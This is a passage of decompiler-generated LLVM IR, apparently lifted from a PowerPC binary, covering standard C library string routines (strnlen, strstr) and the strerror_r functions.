  %v2_1000eef8 = phi i32 [ %v3_1000eef8, %dec_label_pc_1000ef00.dec_label_pc_1000eee8_crit_edge ], [ %v2_1000eef8.pre, %dec_label_pc_1000eedc ]
  %v0_1000eeec = phi i32 [ %v0_1000eeec.pre, %dec_label_pc_1000ef00.dec_label_pc_1000eee8_crit_edge ], [ %v1_1000eedc, %dec_label_pc_1000eedc ]
  %v0_1000eee8 = load i32, i32* @r4, align 4
  %v1_1000eee8 = inttoptr i32 %v0_1000eee8 to i8*
  %v2_1000eee8 = load i8, i8* %v1_1000eee8, align 1
  %v1_1000eeec = add i32 %v0_1000eeec, -1
  store i32 %v1_1000eeec, i32* %r9.global-to-local, align 4
  %v1_1000eef0 = add i32 %v0_1000eee8, 1
  store i32 %v1_1000eef0, i32* @r4, align 4
  %v3_1000eef4 = icmp eq i8 %v2_1000eee8, 0
  store i1 %v3_1000eef4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000eef8 = add i32 %v2_1000eef8, 1
  %v4_1000eef8 = inttoptr i32 %v3_1000eef8 to i8*
  store i8 %v2_1000eee8, i8* %v4_1000eef8, align 1
  store i32 %v3_1000eef8, i32* %r11.global-to-local, align 4
  %v0_1000eefc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000eefc = add i32 %v0_1000eefc, -1
  store i32 %v1_1000eefc, i32* %ctr.global-to-local, align 4
  %v2_1000eefc = icmp eq i32 %v1_1000eefc, 0
  br i1 %v2_1000eefc, label %dec_label_pc_1000ef14, label %dec_label_pc_1000ef00

dec_label_pc_1000ef00:                            ; preds = %dec_label_pc_1000eee8
  %v0_1000ef00 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000ef00, label %dec_label_pc_1000ef04, label %dec_label_pc_1000ef00.dec_label_pc_1000eee8_crit_edge

dec_label_pc_1000ef00.dec_label_pc_1000eee8_crit_edge: ; preds = %dec_label_pc_1000ef00
  %v0_1000eeec.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000eee8

dec_label_pc_1000ef04:                            ; preds = %dec_label_pc_1000ef00, %dec_label_pc_1000eec8
  %v2_1000ef0c.pre = phi i32 [ %v2_1000ef0c.pre.pre, %dec_label_pc_1000eec8 ], [ %v3_1000eef8, %dec_label_pc_1000ef00 ]
  %v0_1000ef04 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1000ef04, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000ef08

dec_label_pc_1000ef08:                            ; preds = %dec_label_pc_1000ef08, %dec_label_pc_1000ef04
  %v2_1000ef0c = phi i32 [ %v3_1000ef0c, %dec_label_pc_1000ef08 ], [ %v2_1000ef0c.pre, %dec_label_pc_1000ef04 ]
  %v3_1000ef0c = add i32 %v2_1000ef0c, 1
  %v4_1000ef0c = inttoptr i32 %v3_1000ef0c to i8*
  store i8 0, i8* %v4_1000ef0c, align 1
  store i32 %v3_1000ef0c, i32* %r11.global-to-local, align 4
  %v0_1000ef10 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ef10 = add i32 %v0_1000ef10, -1
  store i32 %v1_1000ef10, i32* %ctr.global-to-local, align 4
  %v2_1000ef10 = icmp eq i32 %v1_1000ef10, 0
  br i1 %v2_1000ef10, label %dec_label_pc_1000ef14, label %dec_label_pc_1000ef08

dec_label_pc_1000ef14:                            ; preds = %dec_label_pc_1000eee8, %dec_label_pc_1000ef08
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000ef10, { 1, 0 }
  uselistorder i32 %v3_1000ef0c, { 1, 2, 0 }
  uselistorder i32 %v1_1000eefc, { 1, 0 }
  uselistorder i32 %v3_1000eef8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000eedc, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000eec0, { 1, 0 }
  uselistorder i32 %v3_1000eeb8, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ef14, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000ef18 = load i32, i32* @r4, align 4
  %v3_1000ef18 = icmp eq i32 %v0_1000ef18, 0
  %v0_1000ef24 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ef18, i32 %v0_1000ef24)
  %v1_1000ef34 = load i32, i32* @r4, align 4
  %v2_1000ef34 = add i32 %v1_1000ef34, %tmp
  %v3_1000ef38 = icmp ugt i32 %v2_1000ef34, %tmp
  %v4_1000ef38 = icmp eq i32 %v1_1000ef34, 0
  %v2_1000ef3c = or i1 %v4_1000ef38, %v3_1000ef38
  br i1 %v2_1000ef3c, label %dec_label_pc_1000ef44, label %dec_label_pc_1000ef40

dec_label_pc_1000ef2c:                            ; preds = %dec_label_pc_1000efac
  br label %dec_label_pc_1000eff0

dec_label_pc_1000ef40:                            ; preds = %entry
  br label %dec_label_pc_1000ef44

dec_label_pc_1000ef44:                            ; preds = %entry, %dec_label_pc_1000ef40
  %v0_1000eff4 = phi i32 [ %v2_1000ef34, %entry ], [ -1, %dec_label_pc_1000ef40 ]
  %v1_1000ef746 = urem i32 %tmp, 4
  %v3_1000ef748 = icmp eq i32 %v1_1000ef746, 0
  br i1 %v3_1000ef748, label %dec_label_pc_1000ef7c, label %dec_label_pc_1000ef4c

dec_label_pc_1000ef4c:                            ; preds = %dec_label_pc_1000ef44, %dec_label_pc_1000ef70
  %v0_1000ef64 = phi i32 [ %v1_1000ef70, %dec_label_pc_1000ef70 ], [ %tmp, %dec_label_pc_1000ef44 ]
  %v1_1000ef4c = inttoptr i32 %v0_1000ef64 to i8*
  %v2_1000ef4c = load i8, i8* %v1_1000ef4c, align 1
  %v3_1000ef50 = icmp eq i8 %v2_1000ef4c, 0
  br i1 %v3_1000ef50, label %dec_label_pc_1000ef58, label %dec_label_pc_1000ef70

dec_label_pc_1000ef58:                            ; preds = %dec_label_pc_1000ef4c
  %v3_1000ef58 = icmp ugt i32 %v0_1000eff4, %v0_1000ef64
  %v0_1000ef64.v0_1000eff4 = select i1 %v3_1000ef58, i32 %v0_1000ef64, i32 %v0_1000eff4
  %v2_1000ef68 = sub i32 %v0_1000ef64.v0_1000eff4, %tmp
  ret i32 %v2_1000ef68

dec_label_pc_1000ef70:                            ; preds = %dec_label_pc_1000ef4c
  %v1_1000ef70 = add i32 %v0_1000ef64, 1
  %v1_1000ef74 = urem i32 %v1_1000ef70, 4
  %v3_1000ef74 = icmp eq i32 %v1_1000ef74, 0
  br i1 %v3_1000ef74, label %dec_label_pc_1000ef7c, label %dec_label_pc_1000ef4c

dec_label_pc_1000ef7c:                            ; preds = %dec_label_pc_1000ef70, %dec_label_pc_1000ef44
  %v0_1000ef80 = phi i32 [ %tmp, %dec_label_pc_1000ef44 ], [ %v1_1000ef70, %dec_label_pc_1000ef70 ]
  store i32 -2139062144, i32* @r7, align 4
  %v2_1000efe83 = icmp ult i32 %v0_1000ef80, %v0_1000eff4
  br i1 %v2_1000efe83, label %dec_label_pc_1000ef8c, label %dec_label_pc_1000eff0

dec_label_pc_1000ef8c:                            ; preds = %dec_label_pc_1000ef7c, %dec_label_pc_1000efe4
  %v0_1000ef2c = phi i32 [ %v1_1000ef90, %dec_label_pc_1000efe4 ], [ %v0_1000ef80, %dec_label_pc_1000ef7c ]
  %v1_1000ef8c = inttoptr i32 %v0_1000ef2c to i32*
  %v2_1000ef8c = load i32, i32* %v1_1000ef8c, align 4
  %v1_1000ef90 = add i32 %v0_1000ef2c, 4
  store i32 %v0_1000ef2c, i32* @r8, align 4
  %v1_1000ef9c = add i32 %v2_1000ef8c, -16843009
  %v2_1000efa0 = and i32 %v1_1000ef9c, -2139062144
  %v5_1000efa0 = icmp eq i32 %v2_1000efa0, 0
  %v1_1000efa4 = add i32 %v0_1000ef2c, 1
  br i1 %v5_1000efa0, label %dec_label_pc_1000efe4, label %dec_label_pc_1000efac

dec_label_pc_1000efac:                            ; preds = %dec_label_pc_1000ef8c
  %v2_1000efac = inttoptr i32 %v0_1000ef2c to i8*
  %v3_1000efac = load i8, i8* %v2_1000efac, align 1
  %v3_1000efb0 = icmp eq i8 %v3_1000efac, 0
  br i1 %v3_1000efb0, label %dec_label_pc_1000ef2c, label %dec_label_pc_1000efb8

dec_label_pc_1000efb8:                            ; preds = %dec_label_pc_1000efac
  %v2_1000efb8 = inttoptr i32 %v1_1000efa4 to i8*
  %v3_1000efb8 = load i8, i8* %v2_1000efb8, align 1
  %v3_1000efbc = icmp eq i8 %v3_1000efb8, 0
  br i1 %v3_1000efbc, label %dec_label_pc_1000eff0, label %dec_label_pc_1000efc4

dec_label_pc_1000efc4:                            ; preds = %dec_label_pc_1000efb8
  %v1_1000efc4 = add i32 %v0_1000ef2c, 2
  %v2_1000efc4 = inttoptr i32 %v1_1000efc4 to i8*
  %v3_1000efc4 = load i8, i8* %v2_1000efc4, align 1
  %v3_1000efcc = icmp eq i8 %v3_1000efc4, 0
  br i1 %v3_1000efcc, label %dec_label_pc_1000eff0, label %dec_label_pc_1000efd4

dec_label_pc_1000efd4:                            ; preds = %dec_label_pc_1000efc4
  %v1_1000efd4 = add i32 %v0_1000ef2c, 3
  %v2_1000efd4 = inttoptr i32 %v1_1000efd4 to i8*
  %v3_1000efd4 = load i8, i8* %v2_1000efd4, align 1
  %v3_1000efdc = icmp eq i8 %v3_1000efd4, 0
  br i1 %v3_1000efdc, label %dec_label_pc_1000eff0, label %dec_label_pc_1000efe4

dec_label_pc_1000efe4:                            ; preds = %dec_label_pc_1000efd4, %dec_label_pc_1000ef8c
  %v2_1000efe8 = icmp ult i32 %v1_1000ef90, %v0_1000eff4
  br i1 %v2_1000efe8, label %dec_label_pc_1000ef8c, label %dec_label_pc_1000eff0

dec_label_pc_1000eff0:                            ; preds = %dec_label_pc_1000efe4, %dec_label_pc_1000efb8, %dec_label_pc_1000efc4, %dec_label_pc_1000efd4, %dec_label_pc_1000ef7c, %dec_label_pc_1000ef2c
  %v0_1000effc = phi i32 [ %v0_1000ef2c, %dec_label_pc_1000ef2c ], [ %v0_1000ef80, %dec_label_pc_1000ef7c ], [ %v1_1000efd4, %dec_label_pc_1000efd4 ], [ %v1_1000efc4, %dec_label_pc_1000efc4 ], [ %v1_1000efa4, %dec_label_pc_1000efb8 ], [ %v0_1000eff4, %dec_label_pc_1000efe4 ]
  %v3_1000eff0 = icmp ugt i32 %v0_1000eff4, %v0_1000effc
  %v0_1000effc.v0_1000eff4 = select i1 %v3_1000eff0, i32 %v0_1000effc, i32 %v0_1000eff4
  %v2_1000f000 = sub i32 %v0_1000effc.v0_1000eff4, %tmp
  ret i32 %v2_1000f000

; uselistorder directives
  uselistorder i32 %v1_1000ef90, { 1, 0 }
  uselistorder i32 %v0_1000ef2c, { 0, 1, 2, 4, 3, 7, 6, 5 }
  uselistorder i32 %v0_1000ef80, { 1, 0, 2 }
  uselistorder i32 %v1_1000ef70, { 1, 0, 2 }
  uselistorder i32 %v0_1000ef64, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000eff4, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000ef34, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000eff0, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000ef8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef44, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_1000f008 = load i8, i8* %arg2, align 1
  %v4_1000f008 = zext i8 %v3_1000f008 to i32
  store i32 %v4_1000f008, i32* %r6.global-to-local, align 4
  %v3_1000f00c = icmp eq i8 %v3_1000f008, 0
  %v0_1000f010 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f00c, i32 %v0_1000f010)
  %v1_1000f014 = add i32 %arg1, -1
  store i32 %v1_1000f014, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f018

dec_label_pc_1000f018:                            ; preds = %dec_label_pc_1000f028, %entry
  %v0_1000f018 = phi i32 [ %v1_1000f018, %dec_label_pc_1000f028 ], [ %v1_1000f014, %entry ]
  %v1_1000f018 = add i32 %v0_1000f018, 1
  %v2_1000f018 = inttoptr i32 %v1_1000f018 to i8*
  %v3_1000f018 = load i8, i8* %v2_1000f018, align 1
  store i32 %v1_1000f018, i32* %r3.global-to-local, align 4
  %v3_1000f01c = icmp eq i8 %v3_1000f018, 0
  br i1 %v3_1000f01c, label %dec_label_pc_1000f0f4, label %dec_label_pc_1000f028

dec_label_pc_1000f028:                            ; preds = %dec_label_pc_1000f018
  %v4_1000f020 = icmp eq i8 %v3_1000f018, %v3_1000f008
  br i1 %v4_1000f020, label %dec_label_pc_1000f02c, label %dec_label_pc_1000f018

dec_label_pc_1000f02c:                            ; preds = %dec_label_pc_1000f028
  %v2_1000f02c = add i32 %tmp, 1
  %v3_1000f02c = inttoptr i32 %v2_1000f02c to i8*
  %v4_1000f02c = load i8, i8* %v3_1000f02c, align 1
  %v5_1000f02c = zext i8 %v4_1000f02c to i32
  store i32 %v5_1000f02c, i32* %r5.global-to-local, align 4
  store i32 %v2_1000f02c, i32* %r4.global-to-local, align 4
  %v3_1000f034 = icmp eq i8 %v4_1000f02c, 0
  %v0_1000f038 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f034, i32 %v0_1000f038)
  %v0_1000f03c.sink.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f080

dec_label_pc_1000f048:                            ; preds = %dec_label_pc_1000f0e8
  %v3_1000f048 = load i8, i8* %storemerge4.in.in, align 1
  %v4_1000f048 = zext i8 %v3_1000f048 to i32
  store i32 %v1_1000f03c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f070.preheader

dec_label_pc_1000f070.preheader:                  ; preds = %dec_label_pc_1000f048, %dec_label_pc_1000f080
  %v0_1000f07017 = phi i32 [ %v4_1000f048, %dec_label_pc_1000f048 ], [ %storemerge4, %dec_label_pc_1000f080 ]
  %v1_1000f070.pre = load i32, i32* %r6.global-to-local, align 4
  %v4_1000f07025 = icmp eq i32 %v0_1000f07017, %v1_1000f070.pre
  %v3_1000f07427 = icmp eq i32 %v0_1000f07017, 0
  br i1 %v4_1000f07025, label %dec_label_pc_1000f080, label %dec_label_pc_1000f054

dec_label_pc_1000f054:                            ; preds = %dec_label_pc_1000f070.preheader, %dec_label_pc_1000f06c
  %v3_1000f07429 = phi i1 [ %v3_1000f074, %dec_label_pc_1000f06c ], [ %v3_1000f07427, %dec_label_pc_1000f070.preheader ]
  %v0_1000f05828 = phi i32 [ %v1_1000f06c, %dec_label_pc_1000f06c ], [ %v1_1000f03c, %dec_label_pc_1000f070.preheader ]
  br i1 %v3_1000f07429, label %dec_label_pc_1000f0f4, label %dec_label_pc_1000f058

dec_label_pc_1000f058:                            ; preds = %dec_label_pc_1000f054
  %v1_1000f058 = add i32 %v0_1000f05828, 1
  %v2_1000f058 = inttoptr i32 %v1_1000f058 to i8*
  %v3_1000f058 = load i8, i8* %v2_1000f058, align 1
  %v4_1000f058 = zext i8 %v3_1000f058 to i32
  store i32 %v1_1000f058, i32* %r11.global-to-local, align 4
  %v4_1000f05c = icmp eq i32 %v4_1000f058, %v1_1000f070.pre
  br i1 %v4_1000f05c, label %dec_label_pc_1000f080, label %dec_label_pc_1000f068

dec_label_pc_1000f068:                            ; preds = %dec_label_pc_1000f058
  %v3_1000f060 = icmp eq i8 %v3_1000f058, 0
  br i1 %v3_1000f060, label %dec_label_pc_1000f0f4, label %dec_label_pc_1000f06c

dec_label_pc_1000f06c:                            ; preds = %dec_label_pc_1000f068
  %v1_1000f06c = add i32 %v0_1000f05828, 2
  %v2_1000f06c = inttoptr i32 %v1_1000f06c to i8*
  %v3_1000f06c = load i8, i8* %v2_1000f06c, align 1
  %v4_1000f06c = zext i8 %v3_1000f06c to i32
  store i32 %v1_1000f06c, i32* %r11.global-to-local, align 4
  %v4_1000f070 = icmp eq i32 %v4_1000f06c, %v1_1000f070.pre
  %v3_1000f074 = icmp eq i8 %v3_1000f06c, 0
  br i1 %v4_1000f070, label %dec_label_pc_1000f080, label %dec_label_pc_1000f054

dec_label_pc_1000f080:                            ; preds = %dec_label_pc_1000f070.preheader, %dec_label_pc_1000f06c, %dec_label_pc_1000f058, %dec_label_pc_1000f02c
  %v0_1000f03c.sink = phi i32 [ %v0_1000f03c.sink.pre, %dec_label_pc_1000f02c ], [ %v1_1000f03c, %dec_label_pc_1000f070.preheader ], [ %v1_1000f06c, %dec_label_pc_1000f06c ], [ %v1_1000f058, %dec_label_pc_1000f058 ]
  %v1_1000f03c = add i32 %v0_1000f03c.sink, 1
  %storemerge4.in.in = inttoptr i32 %v1_1000f03c to i8*
  %storemerge4.in = load i8, i8* %storemerge4.in.in, align 1
  %storemerge4 = zext i8 %storemerge4.in to i32
  store i32 %v1_1000f03c, i32* %r11.global-to-local, align 4
  %v1_1000f080 = load i32, i32* %r5.global-to-local, align 4
  %v4_1000f080 = icmp eq i32 %storemerge4, %v1_1000f080
  br i1 %v4_1000f080, label %dec_label_pc_1000f088, label %dec_label_pc_1000f070.preheader

dec_label_pc_1000f088:                            ; preds = %dec_label_pc_1000f080
  %v1_1000f088 = add i32 %v0_1000f03c.sink, 2
  %v2_1000f088 = inttoptr i32 %v1_1000f088 to i8*
  %v3_1000f088 = load i8, i8* %v2_1000f088, align 1
  %v4_1000f088 = zext i8 %v3_1000f088 to i32
  store i32 %v4_1000f088, i32* %r10.global-to-local, align 4
  store i32 %v0_1000f03c.sink, i32* %r3.global-to-local, align 4
  %v0_1000f090 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f090 = add i32 %v0_1000f090, 1
  %v2_1000f090 = inttoptr i32 %v1_1000f090 to i8*
  %v3_1000f090 = load i8, i8* %v2_1000f090, align 1
  %v4_1000f090 = zext i8 %v3_1000f090 to i32
  store i32 %v1_1000f090, i32* %r8.global-to-local, align 4
  store i32 %v1_1000f088, i32* %r11.global-to-local, align 4
  %v4_1000f09c = icmp eq i8 %v3_1000f088, %v3_1000f090
  br i1 %v4_1000f09c, label %dec_label_pc_1000f0a4, label %dec_label_pc_1000f0e8

dec_label_pc_1000f0a4:                            ; preds = %dec_label_pc_1000f088, %dec_label_pc_1000f0d0.dec_label_pc_1000f0a4_crit_edge
  %v0_1000f0ac = phi i32 [ %v0_1000f0ac.pre, %dec_label_pc_1000f0d0.dec_label_pc_1000f0a4_crit_edge ], [ %v1_1000f090, %dec_label_pc_1000f088 ]
  %v0_1000f0a8 = phi i32 [ %v0_1000f0a8.pre, %dec_label_pc_1000f0d0.dec_label_pc_1000f0a4_crit_edge ], [ %v1_1000f088, %dec_label_pc_1000f088 ]
  %v0_1000f0a4 = phi i32 [ %v4_1000f0d4, %dec_label_pc_1000f0d0.dec_label_pc_1000f0a4_crit_edge ], [ %v4_1000f088, %dec_label_pc_1000f088 ]
  %v3_1000f0a4 = icmp eq i32 %v0_1000f0a4, 0
  %v1_1000f0a8 = add i32 %v0_1000f0a8, 1
  store i32 %v1_1000f0a8, i32* %r7.global-to-local, align 4
  %v1_1000f0ac = add i32 %v0_1000f0ac, 1
  store i32 %v1_1000f0ac, i32* %r10.global-to-local, align 4
  %v0_1000f0b0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f0a4, i32 %v0_1000f0b0)
  %v0_1000f0b4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f0b4 = add i32 %v0_1000f0b4, 1
  %v2_1000f0b4 = inttoptr i32 %v1_1000f0b4 to i8*
  %v3_1000f0b4 = load i8, i8* %v2_1000f0b4, align 1
  %v4_1000f0b4 = zext i8 %v3_1000f0b4 to i32
  %v0_1000f0b8 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f0b8 = add i32 %v0_1000f0b8, 1
  store i32 %v1_1000f0b8, i32* %r8.global-to-local, align 4
  %v0_1000f0bc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f0bc = add i32 %v0_1000f0bc, 1
  %v2_1000f0bc = inttoptr i32 %v1_1000f0bc to i8*
  %v3_1000f0bc = load i8, i8* %v2_1000f0bc, align 1
  %v0_1000f0c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000f0c0 = add i32 %v0_1000f0c0, 1
  store i32 %v1_1000f0c0, i32* %r11.global-to-local, align 4
  %v4_1000f0c8 = icmp eq i8 %v3_1000f0bc, %v3_1000f0b4
  br i1 %v4_1000f0c8, label %dec_label_pc_1000f0d0, label %dec_label_pc_1000f0e8

dec_label_pc_1000f0d0:                            ; preds = %dec_label_pc_1000f0a4
  %v3_1000f0c4 = icmp eq i8 %v3_1000f0b4, 0
  %v0_1000f0d0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f0c4, i32 %v0_1000f0d0)
  %v0_1000f0d4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f0d4 = add i32 %v0_1000f0d4, 1
  %v2_1000f0d4 = inttoptr i32 %v1_1000f0d4 to i8*
  %v3_1000f0d4 = load i8, i8* %v2_1000f0d4, align 1
  %v4_1000f0d4 = zext i8 %v3_1000f0d4 to i32
  %v0_1000f0d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000f0d8 = add i32 %v0_1000f0d8, 1
  %v2_1000f0d8 = inttoptr i32 %v1_1000f0d8 to i8*
  %v3_1000f0d8 = load i8, i8* %v2_1000f0d8, align 1
  store i32 %v4_1000f0d4, i32* %r10.global-to-local, align 4
  %v4_1000f0e0 = icmp eq i8 %v3_1000f0d8, %v3_1000f0d4
  br i1 %v4_1000f0e0, label %dec_label_pc_1000f0d0.dec_label_pc_1000f0a4_crit_edge, label %dec_label_pc_1000f0e8

dec_label_pc_1000f0d0.dec_label_pc_1000f0a4_crit_edge: ; preds = %dec_label_pc_1000f0d0
  %v0_1000f0a8.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000f0ac.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f0a4

dec_label_pc_1000f0e8:                            ; preds = %dec_label_pc_1000f0d0, %dec_label_pc_1000f0a4, %dec_label_pc_1000f088
  %v0_1000f0e8 = phi i32 [ %v4_1000f090, %dec_label_pc_1000f088 ], [ %v4_1000f0d4, %dec_label_pc_1000f0d0 ], [ %v4_1000f0b4, %dec_label_pc_1000f0a4 ]
  %v3_1000f0e8 = icmp eq i32 %v0_1000f0e8, 0
  br i1 %v3_1000f0e8, label %dec_label_pc_1000f0f0, label %dec_label_pc_1000f048

dec_label_pc_1000f0f0:                            ; preds = %dec_label_pc_1000f0e8
  ret i32 %v0_1000f03c.sink

dec_label_pc_1000f0f4:                            ; preds = %dec_label_pc_1000f018, %dec_label_pc_1000f068, %dec_label_pc_1000f054
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1000f0d4, { 0, 2, 1 }
  uselistorder i8 %v3_1000f0b4, { 1, 0, 2 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i8* %storemerge4.in.in, { 1, 0 }
  uselistorder i32 %v1_1000f03c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1000f03c.sink, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000f06c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000f05828, { 1, 0 }
  uselistorder i32 %v1_1000f070.pre, { 1, 2, 0 }
  uselistorder i32 %v1_1000f018, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000f0f4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f0a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f080, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000f054, { 1, 0 }
  uselistorder label %dec_label_pc_1000f070.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268497172, i32* @lr, align 4
  %v0_1000f110 = call i32 @__xpg_strerror_r()
  %v0_1000f118 = load i32, i32* @r29, align 4
  ret i32 %v0_1000f118
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1000f12c = load i32, i32* @r3, align 4
  %v2_1000f12c = icmp ugt i32 %v0_1000f12c, 124
  %v0_1000f13c = load i32, i32* @r4, align 4
  store i32 %v0_1000f13c, i32* %r27.global-to-local, align 4
  %v0_1000f144 = load i32, i32* @r5, align 4
  br i1 %v2_1000f12c, label %dec_label_pc_1000f188, label %dec_label_pc_1000f14c

dec_label_pc_1000f14c:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1001725c.641 to i32), i32* %r30.global-to-local, align 4
  %v3_1000f1687 = icmp eq i32 %v0_1000f12c, 0
  br i1 %v3_1000f1687, label %dec_label_pc_1000f17c, label %dec_label_pc_1000f15c

dec_label_pc_1000f15c:                            ; preds = %dec_label_pc_1000f14c, %dec_label_pc_1000f15c
  %v0_1000f160 = phi i32 [ %v1_1000f160, %dec_label_pc_1000f15c ], [ ptrtoint ([8 x i8]* @global_var_1001725c.641 to i32), %dec_label_pc_1000f14c ]
  %v1_1000f160 = add i32 %v0_1000f160, 1
  store i32 %v1_1000f160, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000f15c

dec_label_pc_1000f17c:                            ; preds = %dec_label_pc_1000f14c
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000f1bc

dec_label_pc_1000f188:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1000f12c, 0
  %v1_1000f18c = zext i1 %tmp to i32
  %v2_1000f18c = ashr i32 %v0_1000f12c, 31
  %v3_1000f18c = and i32 %v2_1000f18c, -2
  %v4_1000f18c = or i32 %v3_1000f18c, %v1_1000f18c
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1000f1a0 = bitcast i32* %stack_var_-39 to i8*
  %v6_1000f1a0 = call i32 @_uintmaxtostr(i8* %v5_1000f1a0, i32 %v4_1000f18c, i32 %v0_1000f12c, i32 -10, i32 0)
  %v1_1000f1a8 = add i32 %v6_1000f1a0, -14
  store i32 %v1_1000f1a8, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1001724c.642 to i32), i32* @r4, align 4
  store i32 %v1_1000f1a8, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268497340, i32* @lr, align 4
  %v0_1000f1b8 = call i32 @memcpy()
  %v0_1000f1bc.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1000f1c0.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000f1d0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000f1bc

dec_label_pc_1000f1bc:                            ; preds = %dec_label_pc_1000f17c, %dec_label_pc_1000f188
  %v0_1000f1d0 = phi i32 [ %v0_1000f144, %dec_label_pc_1000f17c ], [ %v0_1000f1d0.pre, %dec_label_pc_1000f188 ]
  %v0_1000f1c0 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1001725c.641 to i32), %dec_label_pc_1000f17c ], [ %v0_1000f1c0.pre, %dec_label_pc_1000f188 ]
  %v1_1000f1c4 = phi i32 [ %v0_1000f13c, %dec_label_pc_1000f17c ], [ %v0_1000f1bc.pre, %dec_label_pc_1000f188 ]
  %tmp19 = icmp slt i32 %v1_1000f1c4, 0
  %v1_1000f1bc = zext i1 %tmp19 to i32
  %v2_1000f1bc = ashr i32 %v1_1000f1c4, 31
  %v3_1000f1bc = and i32 %v2_1000f1bc, -2
  %v4_1000f1bc = or i32 %v3_1000f1bc, %v1_1000f1bc
  store i32 %v0_1000f1c0, i32* @r3, align 4
  %v2_1000f1c4 = xor i32 %v4_1000f1bc, %v1_1000f1c4
  %v2_1000f1c8 = sub i32 %v4_1000f1bc, %v2_1000f1c4
  %tmp20 = icmp slt i32 %v2_1000f1c8, 0
  %v1_1000f1cc = zext i1 %tmp20 to i32
  %v2_1000f1cc = ashr i32 %v2_1000f1c8, 31
  %v3_1000f1cc = and i32 %v2_1000f1cc, -2
  %v4_1000f1cc = or i32 %v3_1000f1cc, %v1_1000f1cc
